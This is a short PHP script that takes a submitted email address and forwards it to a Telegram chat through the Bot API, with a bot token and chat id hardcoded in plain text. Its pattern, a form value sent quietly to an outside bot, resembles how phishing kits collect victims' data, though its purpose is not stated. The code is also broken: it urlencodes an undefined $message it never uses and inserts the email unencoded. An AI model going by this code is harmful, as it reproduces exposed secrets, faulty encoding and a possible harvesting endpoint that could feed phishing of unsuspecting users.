<?php

$email = $_POST['email'];

$chat_name = "776558138";
$token = "7266529281:AAEvJ0vmV1dZ9NvJ1VmlPIdz0zNtcfp6GQI";
 
$text = urlencode($message);
$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_name}&text={$email}";
 
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
 